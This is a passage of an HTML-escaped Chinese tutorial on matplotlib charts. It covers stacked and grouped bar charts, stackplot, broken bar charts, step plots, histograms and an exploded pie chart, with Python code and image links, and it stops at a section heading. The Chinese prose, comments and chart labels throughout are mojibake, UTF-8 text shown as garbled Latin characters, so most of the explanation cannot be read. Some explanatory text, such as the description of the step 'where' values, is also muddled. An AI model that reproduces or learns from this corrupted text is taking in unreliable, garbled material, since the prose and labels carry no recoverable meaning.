&lt;p&gt;æ˜¾ç¤ºç»“æœå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š&lt;br/&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/0/2020/png/281865/1601240532785-092e2c8a-e7a2-47a4-ac82-f7686b5952e3.png#align=left&amp;amp;display=inline&amp;amp;height=462&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=image.png&amp;amp;originHeight=924&amp;amp;originWidth=1418&amp;amp;size=116986&amp;amp;status=done&amp;amp;style=none&amp;amp;width=709&quot; alt=&quot;image.png&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h4 id=&quot;4-å †ç§¯æ¡å½¢å›¾å‚æ•°è¯¦è§£&quot;&gt;4 å †ç§¯æ¡å½¢å›¾å‚æ•°è¯¦è§£&lt;/h4&gt;
&lt;p&gt;åŒç†ï¼Œå †ç§¯æ¡å½¢å›¾å°±æ˜¯æŠŠå †ç§¯å›¾æ¨ªæ”¾ï¼ŒåŸæ¥éœ€è¦è€ƒè™‘åº•éƒ¨çš„æ˜¯å“ªä¸€ä¸ªå€¼ï¼Œç°åœ¨éœ€è¦æ€è€ƒçš„æ˜¯å·¦è¾¹çš„æ˜¯å“ªä¸€ä¸ªå€¼ï¼Œå…·ä½“ä»£ç å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-python&quot;&gt;import matplotlib.pyplot as plt

x = [1, 2, 3, 4, 5]
y = [6, 10, 4, 5, 1]
y1 = [2, 6, 3, 4, 5]

# ä¸­æ–‡æ˜¾ç¤º
plt.rcParams[&quot;font.family&quot;] = 'Arial Unicode MS'

plt.figure(figsize=(8, 5))
plt.barh(x, y, align='center', color='#66c2a5', tick_label=['A', 'B', 'C', 'D', 'E'], label='ç”·äºº')

# è¿™é‡Œä¿®æ”¹äº†left æŒ‡å®šå“ªä¸ªå€¼åœ¨è¿™ä¸ªå›¾çš„ä¸‹è¾¹
plt.barh(x, y1, align='center', left=y, color='#8da0cb', label='å¥³äºº')

plt.xlabel('åŸå¸‚ä»£å·')
plt.ylabel('ç”·å¥³æ¯”ä¾‹')

plt.legend()
plt.show()
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;æ˜¾ç¤ºç»“æœå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š&lt;br/&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/0/2020/png/281865/1601240938737-80f8e54c-9457-4daf-989f-91e48f27509f.png#align=left&amp;amp;display=inline&amp;amp;height=460&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=image.png&amp;amp;originHeight=920&amp;amp;originWidth=1392&amp;amp;size=105068&amp;amp;status=done&amp;amp;style=none&amp;amp;width=696&quot; alt=&quot;image.png&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h4 id=&quot;5-åˆ†å—å›¾å‚æ•°è¯¦è§£&quot;&gt;5 åˆ†å—å›¾å‚æ•°è¯¦è§£&lt;/h4&gt;
&lt;p&gt;å †ç§¯å›¾å¯ä»¥å±•ç¤ºå¤šæ•°æ®å½¢å¼ä¸Šçš„å·®å¼‚ï¼Œä½†æœ‰æ—¶ä¸æ˜¯ç‰¹åˆ«æ˜æ˜¾ï¼Œè¿™æ˜¯ç”¨åˆ†å—å›¾å°±å¯ä»¥å¾ˆç›´è§‚çš„æ¯”è¾ƒå‡ºæ¥ã€‚åˆ†å—å›¾å¯ä»¥åˆ†ä¸ºå¤šæ•°æ®å¹¶åˆ—æŸ±çŠ¶å›¾å’Œå¤šæ•°æ®å¹¶åˆ—æ¡å½¢å›¾ï¼Œæˆ‘ä»¬å…ˆæ¥ä¸€èµ·çœ‹ä¸€ä¸‹å¤šæ•°æ®å¹¶åˆ—æŸ±çŠ¶å›¾ï¼Œå…·ä½“ä»£ç å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-python&quot;&gt;import matplotlib.pyplot as plt
import numpy as np

# ä¸­æ–‡æ˜¾ç¤º
plt.rcParams[&quot;font.family&quot;] = 'Arial Unicode MS'

x = np.arange(5)
y = [6, 10, 4, 5, 1]
y1 = [2, 6, 3, 8, 5]

bar_width = 0.35
tick_label = ['A', 'B', 'C', 'D', 'E']
plt.figure(figsize=(8, 5))

plt.bar(
    x,
    y,
    bar_width,
    color='c',
    align='center',
    label='ç”·äºº',
    alpha=0.5
)

plt.bar(
    x+bar_width,
    y1,
    bar_width,
    color='b',
    align='center',
    label='å¥³äºº',
    alpha=0.3
)

plt.xlabel('åŸå¸‚ä»£å·')
plt.ylabel('ç”·å¥³æ¯”ä¾‹')

plt.xticks(x+bar_width/2, tick_label)

plt.legend()
plt.show()
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;å›¾å½¢æ˜¾ç¤ºç»“æœå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š&lt;br/&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/0/2020/png/281865/1601242120862-fcdf766e-1298-40d9-ba65-1f782b9806a5.png#align=left&amp;amp;display=inline&amp;amp;height=475&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=image.png&amp;amp;originHeight=950&amp;amp;originWidth=1436&amp;amp;size=110082&amp;amp;status=done&amp;amp;style=none&amp;amp;width=718&quot; alt=&quot;image.png&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h4 id=&quot;6-å¤šæ•°æ®å¹¶åˆ—æ¡å½¢å›¾è¯¦è§£&quot;&gt;6 å¤šæ•°æ®å¹¶åˆ—æ¡å½¢å›¾è¯¦è§£&lt;/h4&gt;
&lt;p&gt;æ ¹æ®æˆ‘ä»¬çš„å‰é¢çš„è®²è§£ï¼Œä½ åº”è¯¥å·²ç»çŸ¥é“äº†ï¼Œæˆ‘ä»¬åªéœ€è¦æŠŠå‡½æ•°baræ”¹ä¸ºbarhå°±å¯ä»¥ï¼Œä»£ç å¦‚ä¸‹æ‰€ç¤ºï¼š&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-python&quot;&gt;import matplotlib.pyplot as plt
import numpy as np

# ä¸­æ–‡æ˜¾ç¤º
plt.rcParams[&quot;font.family&quot;] = 'Arial Unicode MS'

x = np.arange(5)
y = [6, 10, 4, 5, 1]
y1 = [2, 6, 3, 8, 5]

bar_width = 0.35
tick_label = ['A', 'B', 'C', 'D', 'E']
plt.figure(figsize=(8, 5))

plt.barh(
    x,
    y,
    bar_width,
    color='c',
    align='center',
    label='ç”·äºº',
    alpha=0.5,
    hatch='\/'  # å¦‚æœæˆ‘ä»¬éœ€è¦æ·»åŠ ä¸€äº›è£…é¥°çº¿å¯ä»¥ä½¿ç”¨hatchå‚æ•°
)

plt.barh(
    x+bar_width,
    y1,
    bar_width,
    color='b',
    align='center',
    label='å¥³äºº',
    alpha=0.3,
    hatch='\\'  
)

plt.xlabel('åŸå¸‚ä»£å·')
plt.ylabel('ç”·å¥³æ¯”ä¾‹')

plt.xticks(x+bar_width/2, tick_label)

plt.legend()
plt.show()
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;å›¾å½¢æ˜¾ç¤ºç»“æœå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š&lt;br/&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/0/2020/png/281865/1601243145929-4d39f050-08c5-431f-9c97-d0547f0f632e.png#align=left&amp;amp;display=inline&amp;amp;height=467&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=image.png&amp;amp;originHeight=934&amp;amp;originWidth=1404&amp;amp;size=135011&amp;amp;status=done&amp;amp;style=none&amp;amp;width=702&quot; alt=&quot;image.png&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h4 id=&quot;7-å †ç§¯æŠ˜çº¿å›¾å‚æ•°è¯¦è§£&quot;&gt;7 å †ç§¯æŠ˜çº¿å›¾å‚æ•°è¯¦è§£&lt;/h4&gt;
&lt;p&gt;å †ç§¯æŠ˜çº¿å›¾æ˜¯é€šè¿‡ç»˜åˆ¶ä¸åŒæ•°æ®é›†çš„æŠ˜çº¿å›¾è€Œç”Ÿæˆçš„ï¼ŒæŒ‰ç…§å‚ç›´æ–¹å‘ä¸Šå½¼æ­¤å †å ä¸”åˆä¸äº’ç›¸è¦†ç›–çš„æ’åˆ—é¡ºåºï¼Œç»˜åˆ¶è‹¥å¹²æ¡æŠ˜çº¿å›¾è€Œå½¢æˆçš„ç»„åˆå›¾å½¢ã€‚&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-python&quot;&gt;import matplotlib.pyplot as plt
import numpy as np

x = np.arange(1, 6, 1)
y = [0, 4, 3, 5, 6]
y1 = [1, 3, 4, 2, 7]
y2 = [3, 4, 1, 6, 5]

labels = ['2018', '2019', '2020']
colors = ['r', 'b', 'y']

plt.stackplot(x, y, y1, y2, labels=labels, colors=colors)

plt.legend()
plt.show()
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;å›¾å½¢æ˜¾ç¤ºç»“æœå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š&lt;br/&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/0/2020/png/281865/1601243881281-acc457e0-db58-4d77-ac98-f44e91770862.png#align=left&amp;amp;display=inline&amp;amp;height=444&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=image.png&amp;amp;originHeight=888&amp;amp;originWidth=1170&amp;amp;size=127677&amp;amp;status=done&amp;amp;style=none&amp;amp;width=585&quot; alt=&quot;image.png&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h4 id=&quot;8-é—´æ–­æ¡å½¢å›¾å‚æ•°è¯¦è§£&quot;&gt;8 é—´æ–­æ¡å½¢å›¾å‚æ•°è¯¦è§£&lt;/h4&gt;
&lt;p&gt;é—´æ–­æ¡å½¢å›¾æ˜¯åœ¨æ¡å½¢å›¾çš„åŸºç¡€ä¹‹ä¸Šç»˜åˆ¶è€Œæˆçš„ï¼Œä¸»è¦ç”¨æ¥å¯è§†åŒ–å®šæ€§æ•°æ®çš„ç›¸åŒæŒ‡æ ‡åœ¨æ—¶é—´ç»´åº¦ä¸Šçš„æŒ‡æ ‡å€¼çš„å˜åŒ–æƒ…å†µï¼Œç›´è§‚æ¯”è¾ƒå¹¶å±•ç°å‡ºå®šæ€§æ•°æ®çš„ç›¸åŒæŒ‡æ ‡çš„å˜åŒ–æƒ…å†µã€‚&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-python&quot;&gt;import matplotlib.pyplot as plt
import numpy as np

# ä¸­æ–‡æ˜¾ç¤º
plt.rcParams[&quot;font.family&quot;] = 'Arial Unicode MS'

plt.broken_barh(
    # å…ƒç»„ä¸­ç¬¬ä¸€ä¸ªå…ƒç´ ä»£è¡¨è·ç¦»yè½´çš„è·ç¦»ï¼Œç¬¬äºŒä¸ªå…ƒç´ ä»£è¡¨è‡ªèº«çš„å®½åº¦
    [(10, 20), (190, 60), (270, 80), (370, 80)],
    # å…ƒç»„ä¸­ç¬¬ä¸€ä¸ªå…ƒç´ ä»£è¡¨è·ç¦»xè½´çš„è·ç¦»ï¼Œç¬¬äºŒä¸ªå…ƒç´ ä»£è¡¨è‡ªèº«çš„é•¿åº¦
    (30, 9),
    facecolors='r'
)

plt.broken_barh(
    [(30, 80), (190, 60), (270, 80), (360, 30)],
    (10, 5),
    facecolors=('b', 'y', 'g', 'purple')
)

# å®šä¹‰åæ ‡è½´çš„èŒƒå›´
plt.xlim(0, 500)
plt.ylim(5, 50)

# å®šä¹‰xè½´çš„åç§°
plt.xlabel('ä¸Šè¯¾æ—¶é—´')

# å®šä¹‰xè½´çš„åˆ»åº¦
plt.xticks(np.arange(0, 361, 60))

# å®šä¹‰yè½´çš„åˆ»åº¦å’Œåç§°
plt.yticks([15, 25], ['ä¸€ç­', 'äºŒç­'])

# å®šä¹‰åˆ»åº¦çš„æ ·å¼
plt.grid(ls='--', lw=1, color='gray')

# å®šä¹‰ä¸»é¢˜åç§°
plt.title('ä¸¤ä¸ªç­çº§çš„ä¸Šè¯¾æ—¶é—´')

plt.show()
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;å›¾å½¢æ˜¾ç¤ºç»“æœå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š&lt;br/&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/0/2020/png/281865/1601246420302-6d3cbe3c-2f5d-4a98-87c4-eb4f5759e327.png#align=left&amp;amp;display=inline&amp;amp;height=456&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=image.png&amp;amp;originHeight=912&amp;amp;originWidth=1150&amp;amp;size=100390&amp;amp;status=done&amp;amp;style=none&amp;amp;width=575&quot; alt=&quot;image.png&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h4 id=&quot;9-é˜¶æ¢¯å›¾å‚æ•°è¯¦è§£&quot;&gt;9 é˜¶æ¢¯å›¾å‚æ•°è¯¦è§£&lt;/h4&gt;
&lt;p&gt;é˜¶æ¢¯å›¾å°±å¦‚å…¶åå­—é‚£æ ·ï¼Œåƒä¸€å°é˜¶ä¸€æ ·ï¼Œæ—¶è€Œä¸Šå‡ï¼Œæ—¶è€Œä¸‹é™ï¼Œæˆ‘ä»¬ç»å¸¸ç”¨å®ƒæ¥å±•ç¤ºæ•°æ®çš„è¶‹åŠ¿å˜åŒ–æˆ–å‘¨æœŸé¡¾è™‘ã€‚é˜¶æ¢¯å›¾ç»å¸¸ä½¿ç”¨åœ¨æ—¶é—´åºåˆ—çš„æ•°æ®çš„å¯è§†åŒ–ä»»åŠ¡ä¸­ï¼Œæ¯”å¦‚å•†å“çš„æ—¥é”€é‡ã€æœˆé”€é‡ï¼Œä¼ä¸šä¸­æ¯æœˆçš„å‘˜å·¥æ•°é‡çš„å˜åŒ–ç­‰ï¼Œè¿™æ ·æˆ‘ä»¬èƒ½å¤Ÿå¾ˆå®¹æ˜“å‘ç°æ—¶åºæ•°æ®çš„æ³¢åŠ¨å‘¨æœŸå’Œè§„å¾‹ã€‚&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-python&quot;&gt;import matplotlib.pyplot as plt
import numpy as np

x = np.linspace(1, 10, 10)
print(x)
y = np.sin(x)
print(y)

# ä»£ç 1
plt.step(x, y, color='b', where='pre', lw=2)
plt.xlim(0, 12)
plt.ylim(-1.2, 1.2)
plt.xticks(np.arange(1, 13, 1))
plt.grid(ls='--', lw=1, color='gray')
plt.show()

# ä»£ç 2 
plt.step(x, y, color='b', where='mid', lw=2)
plt.xlim(0, 12)
plt.ylim(-1.2, 1.2)
plt.xticks(np.arange(1, 13, 1))
plt.grid(ls='--', lw=1, color='gray')
plt.show()

# ä»£ç 3
plt.step(x, y, color='b', where='post', lw=2)
plt.xlim(0, 12)
plt.ylim(-1.2, 1.2)
plt.xticks(np.arange(1, 13, 1))
plt.grid(ls='--', lw=1, color='gray')
plt.show()
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;è¿™é‡Œæœ‰ä¸€ä¸ªæ–°çš„å‚æ•°whereï¼Œä½ å¯ä»¥åˆ†åˆ«è¿è¡Œè¿™ä¸‰æ®µä»£ç ï¼Œå¯ä»¥çœ‹åˆ°å›¾å½¢å¥½åƒæ˜¯åœ¨å¾€å³è¾¹ç§»åŠ¨ï¼Œæ˜¾ç¤ºç»“æœå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š&lt;br/&gt;ä»£ç 1ï¼š&lt;br/&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/0/2020/png/281865/1601277840243-d58a2d13-7cb7-4271-b0f2-b203edc1013a.png#align=left&amp;amp;display=inline&amp;amp;height=697&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=image.png&amp;amp;originHeight=1394&amp;amp;originWidth=1836&amp;amp;size=272714&amp;amp;status=done&amp;amp;style=none&amp;amp;width=918&quot; alt=&quot;image.png&quot; loading=&quot;lazy&quot;/&gt;&lt;br/&gt;ä»£ç 2ï¼š&lt;br/&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/0/2020/png/281865/1601277875322-47c59867-056e-4fb1-927f-dc12fcad653f.png#align=left&amp;amp;display=inline&amp;amp;height=680&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=image.png&amp;amp;originHeight=1360&amp;amp;originWidth=1798&amp;amp;size=320421&amp;amp;status=done&amp;amp;style=none&amp;amp;width=899&quot; alt=&quot;image.png&quot; loading=&quot;lazy&quot;/&gt;&lt;br/&gt;ä»£ç 3ï¼š&lt;br/&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/0/2020/png/281865/1601277905394-c9376501-d741-4045-bf83-6d616a9e20cd.png#align=left&amp;amp;display=inline&amp;amp;height=696&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=image.png&amp;amp;originHeight=1392&amp;amp;originWidth=1814&amp;amp;size=296687&amp;amp;status=done&amp;amp;style=none&amp;amp;width=907&quot; alt=&quot;image.png&quot; loading=&quot;lazy&quot;/&gt;&lt;br/&gt;whereå‚æ•°ä¸»è¦ç”¨æ¥å®šä¹‰stepåº”è¯¥æ”¾åœ¨å“ªé‡Œï¼Œæˆ‘ä»¬æŠŠå›¾å½¢ä¸­çš„æ¯æ¡æ¨ªçº¿å¯ä»¥çœ‹ä½œä¸€ä¸ªstepï¼Œwhereå­—æ®µä¸€å…±æœ‰ä¸‰ä¸ªå–å€¼ï¼Œåˆ†åˆ«æ˜¯ï¼špreï¼Œmidå’Œpostï¼Œå¦‚æœæˆ‘ä»¬åœ¨xä¸º1å’Œ2çš„ä¸¤ä¸ªä½ç½®ä¸Šç”»ä¸€æ¡æ¨ªçº¿ï¼ˆå¦‚ä¸Šå›¾çº¢çº¿æ‰€ç¤ºï¼‰ï¼Œä½ ä¼šå‘ç°ï¼Œå½“where='pre'æ—¶ï¼Œyå–å€¼çš„ç¬¬ä¸€ä¸ªç‚¹åº”è¯¥æ˜¯åœ¨xç¬¬ä¸€ä¸ªç‚¹å·¦ä¾§ä¸€äº›ï¼Œå½“where='mid'æ—¶ï¼Œyå–å€¼çš„ç¬¬ä¸€ä¸ªç‚¹åº”è¯¥æ˜¯åœ¨xç¬¬ä¸€ä¸ªç‚¹ä¸­é—´ï¼Œyå–å€¼çš„ç¬¬ä¸€ä¸ªç‚¹åº”è¯¥æ˜¯åœ¨xç¬¬ä¸€ä¸ªç‚¹å³ä¾§ã€‚&lt;/p&gt;
&lt;h3 id=&quot;å››-å®ä¾‹é¡¹ç›®è‡ªç”±ç»˜å›¾&quot;&gt;å›› å®ä¾‹é¡¹ç›®è‡ªç”±ç»˜å›¾&lt;/h3&gt;
&lt;h4 id=&quot;1-ç›´æ–¹å›¾&quot;&gt;1 ç›´æ–¹å›¾&lt;/h4&gt;
&lt;p&gt;ç›´æ–¹å›¾æ“…é•¿å±•ç¤ºåŒºé—´åˆ†å¸ƒï¼Œæ¯”å¦‚æŸä¸€ç§‘ç›®çš„è€ƒè¯•æˆç»©ï¼ŒæŒ‰ç…§åœ°åŒºç»Ÿè®¡çš„äººå‡å¯¿å‘½ï¼Œå‘è¾¾å›½å®¶ä¸å‘å±•ä¸­å›½å®¶äººå‡å¯æ”¯é…æ”¶å…¥ç­‰ç­‰ï¼Œç°åœ¨æˆ‘ä»¬éœ€è¦ç»˜åˆ¶æŸä¸ªç­çº§ä¸­Pythonè¯­è¨€è€ƒè¯•æˆç»©çš„åˆ†å¸ƒåŒºé—´å›¾ã€‚&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-python&quot;&gt;import matplotlib.pyplot as plt
import numpy as np

# ä¸­æ–‡æ˜¾ç¤º
plt.rcParams[&quot;font.family&quot;] = 'Arial Unicode MS'

scores = np.random.randint(0, 100, 100)
bins = range(0, 101, 10)

&quot;&quot;&quot;
histtypeåœ¨è¿™é‡Œæœ‰ä¸‰ä¸ªå‚æ•°ï¼Œåˆ†åˆ«æ˜¯barï¼Œstepå’Œstepfilled
1 barå°±æ˜¯å¡«æ»¡ç›¸åº”é¢œè‰²
2 stepæ˜¯é˜¶æ¢¯å›¾
3 histtypeæ˜¯ç”Ÿæˆä¸€ä¸ªé»˜è®¤çš„lineplotè¿›è¡Œå›¾å½¢å¡«å……å¡«å……ï¼Œæ°å¥½è¿™ä¸ªå‚æ•°çš„é»˜è®¤å€¼å°±æ˜¯bar
&quot;&quot;&quot;
plt.hist(x=scores, bins=bins, color='#3366FF', histtype='bar')
plt.xlabel('Pythonè€ƒè¯•æˆç»©')
plt.ylabel('å­¦ç”Ÿæˆç»©')

plt.show()
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;å›¾å½¢æ˜¾ç¤ºç»“æœå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š&lt;br/&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/0/2020/png/281865/1601373413184-26d0dfd9-375d-4077-ae57-262d0c9a6c02.png#align=left&amp;amp;display=inline&amp;amp;height=453&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=image.png&amp;amp;originHeight=906&amp;amp;originWidth=1170&amp;amp;size=119557&amp;amp;status=done&amp;amp;style=none&amp;amp;width=585&quot; alt=&quot;image.png&quot; loading=&quot;lazy&quot;/&gt;&lt;br/&gt;åœ¨è¿™é‡Œæˆ‘ä»¬æœ‰å¿…è¦é‡æ–°å†æ¥è¯´ä¸€ä¸‹å…³äºç›´æ–¹å›¾ä¸æŸ±çŠ¶å›¾ï¼Œå› ä¸ºä»–ä»¬çš„æ ·å­å®åœ¨æ˜¯å¤ªåƒäº†ï¼Œåªæ˜¯æŸ±ä½“ä¸æŸ±ä½“ä¹‹é—´æ˜¯å¦å­˜åœ¨ç©ºéš™ï¼Œä½†æ°æ°æ˜¯ç”±äºè¿™ä¸€ç‚¹ï¼Œæ‰è®©å®ƒä»¬æœ‰æ‰€åŒºåˆ«ï¼Œä¹Ÿè®©å®ƒä»¬åˆ†ä¸ºæ“…é•¿è¡¨ç¤ºä¸åŒç±»å‹çš„æ•°æ®ã€‚æˆ‘ä»¬çŸ¥é“æ•°æ®å¯ä»¥åˆ†ä¸ºè¿ç»­å‹æ•°æ®å’Œç¦»æ•£å‹æ•°æ®ï¼Œè¿™é‡Œæˆ‘ä»¬å¯ä»¥å¯¹å®ƒä»¬è¿›è¡Œæ€»ç»“ã€‚ç›´æ–¹å›¾æ“…é•¿æ€»ç»“å’Œæè¿°è¿ç»­å‹æ•°æ®çš„åˆ†å¸ƒï¼Œè€ŒæŸ±çŠ¶å›¾æ›´åŠ çš„æ“…é•¿æè¿°å’Œæ€»ç»“ç¦»æ•£å‹æ•°æ®çš„åˆ†å¸ƒï¼Œæ‰€ä»¥ä½ åœ¨æœªæ¥çš„åº”ç”¨åœºæ™¯ä¸­ï¼Œé¦–å…ˆåˆ¤æ–­æ•°æ®çš„ç‰¹ç‚¹ï¼Œç„¶åå†å†³å®šä½¿ç”¨ä»€ä¹ˆå›¾å½¢å»æè¿°è¿™äº›æ•°æ®ã€‚&lt;/p&gt;
&lt;h4 id=&quot;2-å †å ç›´æ–¹å›¾&quot;&gt;2 å †å ç›´æ–¹å›¾&lt;/h4&gt;
&lt;p&gt;ç°åœ¨æˆ‘ä»¬è¦ç»˜åˆ¶ä¸€ä¸ªåŸºäºåˆšåˆšçš„åœºæ™¯ä¹‹ä¸Šçš„å¦å¤–ä¸€ä¸ªåœºæ™¯ï¼Œå°±æ˜¯æˆ‘ä»¬è¦æ¯”è¾ƒä¸¤ä¸ªç­çº§çš„Pythonè¯­è¨€è€ƒè¯•çš„æˆç»©ï¼Œå¯¹å®ƒä»¬çš„åˆ†å¸ƒæƒ…å†µè¿›è¡Œåˆ†åˆ«çš„æ¯”å¯¹ï¼Œè¿™æ—¶å°±éœ€è¦ç”¨åˆ°å †å ç›´æ–¹å›¾ã€‚&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-python&quot;&gt;import matplotlib.pyplot as plt
import numpy as np

# ä¸­æ–‡æ˜¾ç¤º
plt.rcParams[&quot;font.family&quot;] = 'Arial Unicode MS'

# 1 åˆ†åˆ«ç”Ÿæˆä¸¤ä¸ªç­çº§çš„åˆ†æ•°
scores1 = np.random.randint(0, 100, 100)
scores2 = np.random.randint(0, 100, 100)

# 2 æŠŠä¸¤ä¸ªç­çº§çš„åˆ†æ•°æ”¾åœ¨ä¸€ä¸ªåˆ—è¡¨ä¸­
x = [scores1, scores2]

# 3 é€‰æ‹©ä¸¤ä¸ªå¯¹æ¯”è¾ƒé²œæ˜çš„é¢œè‰²
colors = ['r', 'b']

# 4 å£°æ˜ä¸¤ä¸ªæ ‡ç­¾
labels = ['ä¸€ç­', 'äºŒç­']

# 5 è®¾å®šxè½´çš„èŒƒå›´
bins = range(0, 101, 10)

&quot;&quot;&quot;
æ–°åŠ å…¥çš„å‚æ•°çš„æ„ä¹‰ï¼š
1 rwidth:æŸ±ä½“çš„å®½åº¦ï¼Œ0.0-1.0
2 stack:ä¸Šä¸‹æ’è¿˜æ˜¯å·¦å³æ’
&quot;&quot;&quot;
plt.hist(x, color=colors, histtype='bar', rwidth=1.0, stacked=False, label=labels)
plt.xlabel('Pythonæˆç»©åˆ†å¸ƒ')
plt.ylabel('äººæ•°')
plt.title('ä¸åŒç­çº§çš„Pythonæˆç»©ç›´æ–¹å›¾')

plt.legend(loc=1)  # åŸæ¥ç”¨upper rightè¿™äº›ï¼Œç°åœ¨1è¡¨ç¤ºå³ä¸Šï¼Œ234åˆ†åˆ«å¯¹åº”é€†æ—¶é’ˆæ—‹è½¬ä½ç½®
plt.show()
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;å›¾å½¢æ˜¾ç¤ºç»“æœå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š&lt;br/&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/0/2020/png/281865/1601374577302-582f0425-c612-47dd-ab3a-a6a94308cc8f.png#align=left&amp;amp;display=inline&amp;amp;height=456&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=image.png&amp;amp;originHeight=912&amp;amp;originWidth=1180&amp;amp;size=159007&amp;amp;status=done&amp;amp;style=none&amp;amp;width=590&quot; alt=&quot;image.png&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h4 id=&quot;3-åˆ†è£‚å¼é¥¼å›¾&quot;&gt;3 åˆ†è£‚å¼é¥¼å›¾&lt;/h4&gt;
&lt;p&gt;é¥¼å›¾æ˜¯ç”¨æ¥å±•ç¤ºå®šæ€§æ•°æ®åˆ†å¸ƒæ¯”ä¾‹ç‰¹å¾çš„ç»Ÿè®¡å›¾å½¢ï¼Œåœ¨æ•°æ®å¯è§†åŒ–æ—¶åº”ç”¨çš„éå¸¸å¹¿æ³›ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ç»˜åˆ¶é¥¼å›¾ï¼Œç›´è§‚çš„è§‚å¯Ÿå‡ºæ•°æ®çš„å æ¯”æƒ…å†µã€‚é¥¼å›¾åŒæ ·é€‚ç”¨äºç¦»æ•£å‹æ•°æ®çš„å æ¯”æƒ…å†µï¼Œæ¯”å¦‚ç­çº§å†…ç”·å¥³æ€§åˆ«æ¯”ä¾‹ï¼Œå…¬å¸é”€å”®ä¸šç»©æ¯æœˆåœ¨å…¨å¹´ä¸­çš„å æ¯”æƒ…å†µç­‰ç­‰ã€‚å¯¹äºæ¯”ä¾‹åˆ†å¸ƒçš„åœºæ™¯ï¼Œé¥¼å›¾éƒ½æ˜¯éå¸¸é€‚åˆçš„ã€‚&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-python&quot;&gt;import matplotlib.pyplot as plt
import numpy as np

plt.rcParams[&quot;font.family&quot;] = 'Arial Unicode MS'

labels = ['ç¬¬ä¸€å­£åº¦', 'ç¬¬äºŒå­£åº¦', 'ç¬¬ä¸‰å­£åº¦', 'ç¬¬å››å­£åº¦']
sale = [20, 40, 30, 70]
colors = ['r', 'b', 'y', 'green']

explode = (0.1, 0.1, 0.1, 0.1)

plt.pie(
    sale,
    explode=explode,  # è£‚å¼€çš„é‚£æ¡ç¼çš„å®½åº¦
    labels=labels,
    autopct='%.2f%%',  # %çš„ç²¾åº¦
    startangle=10,  # ä»xè½´ä¸ºèµ·å§‹ä½ç½®ï¼Œé€†æ—¶é’ˆæ—‹è½¬çš„è§’åº¦
    shadow=True,  # é˜´å½±
    colors=colors
)

plt.title('æ¯ä¸€å­£åº¦é”€å”®é¢', loc='right')
plt.show()
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;å›¾å½¢æ˜¾ç¤ºç»“æœå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š&lt;br/&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/0/2020/png/281865/1601375915766-b64c2523-5103-4dff-9af5-88f415af4d95.png#align=left&amp;amp;display=inline&amp;amp;height=445&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=image.png&amp;amp;originHeight=890&amp;amp;originWidth=1244&amp;amp;size=181273&amp;amp;status=done&amp;amp;style=none&amp;amp;width=622&quot; alt=&quot;image.png&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h4 id=&quot;4-å†…åµŒç¯å½¢é¥¼å›¾&quot;&gt;4 å†…åµŒç¯å½¢é¥¼å›¾&lt;/h4&gt;
